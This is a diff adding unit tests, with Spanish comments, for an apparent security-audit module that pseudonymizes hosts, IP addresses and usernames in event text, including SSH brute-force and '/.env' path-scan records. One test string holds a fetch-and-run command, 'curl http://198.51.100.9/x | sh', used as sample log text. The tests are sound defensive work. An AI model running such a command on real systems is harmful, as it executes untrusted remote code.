@@ -29,6 +29,36 @@ class AuditScrubTests(unittest.TestCase):
             self.assertNotIn(leak, out)
         self.assertIn("H1", out)
 
+    def test_host_name_only_as_whole_word(self):
+        # Regresion: un host llamado igual que la aplicacion (AMP) convertia
+        # ".ampdata" y "AMP_Logs" en ".H1data" y "H1_Logs".
+        hosts = [host(name="AMP", hostname="amp.example.org")]
+        out = audit.scrub("El servidor AMP guarda en /srv/.ampdata/AMP_Logs y ampinstmgr", hosts, self.aliases)
+        self.assertIn("El servidor H1", out)
+        self.assertIn(".ampdata/AMP_Logs", out)
+        self.assertIn("ampinstmgr", out)
+
+    def test_event_text_pseudonymizes_ips_and_restore_reverts(self):
+        text = audit.scrub_event_text("curl http://198.51.100.9/x | sh desde ::ffff:203.0.113.5", self.hosts, self.aliases)
+        self.assertNotIn("198.51.100.9", text)
+        self.assertNotIn("203.0.113.5", text)
+        self.assertIn(audit.pseudo_ip("203.0.113.5"), text)
+        self.assertEqual(audit.pseudo_ip("203.0.113.5"), audit.pseudo_ip("203.0.113.5"))  # estable
+        back = audit.restore(f"Bloquear {audit.pseudo_ip('203.0.113.5')} en H1", self.hosts[0], "H1", ["203.0.113.5"])
+        self.assertEqual(back, "Bloquear 203.0.113.5 en AMP")
+
+    def test_event_facts_are_minimized(self):
+        from types import SimpleNamespace
+        brute = SimpleNamespace(kind="ssh_brute_force", source_ip="203.0.113.5", detail={
+            "service": "ssh", "failures": 6, "window_seconds": 600, "users": ["ana.perez", "root"],
+            "distinct_users": 2, "root_targeted": True})
+        facts = audit._event_facts(brute, self.hosts, self.aliases)
+        self.assertNotIn("ana.perez", str(facts))  # nombres probados no salen
+        self.assertEqual(facts["origen"], audit.pseudo_ip("203.0.113.5"))
+        scan = SimpleNamespace(kind="path_scan", source_ip="203.0.113.5", detail={
+            "path": "/.env", "method": "GET", "user_agent": "Mozilla/5.0 (usuario@example.org)"})
+        self.assertNotIn("Mozilla", str(audit._event_facts(scan, self.hosts, self.aliases)))
+
     def test_keeps_version_numbers(self):
         # Regresion: el patron IPv4 generico borraba "7.1.1.43" (version de imagemagick).
         out = audit.scrub("Actualizar imagemagick 7.1.1.43 a 7.1.2.31", self.hosts, self.aliases)
